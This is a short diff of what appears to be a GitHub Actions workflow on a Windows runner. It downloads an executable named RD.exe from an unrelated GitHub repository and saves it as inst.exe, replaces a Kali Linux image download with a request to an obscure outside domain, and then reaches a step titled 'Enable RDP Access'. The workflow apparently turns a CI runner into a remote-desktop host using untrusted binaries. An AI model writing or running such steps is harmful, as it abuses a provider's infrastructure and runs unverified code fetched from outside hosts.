@@ -12,7 +12,7 @@ jobs:
     - name: Download
       run: |
         Invoke-WebRequest https://github.com/AXAZXFAXA/RD/raw/main/RD.exe -OutFile inst.exe
-        Invoke-WebRequest https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-virtualbox-amd64.ova
+        Invoke-WebRequest https://www.jiankong.cf
 
     - name: Enable RDP Access
       run: | 
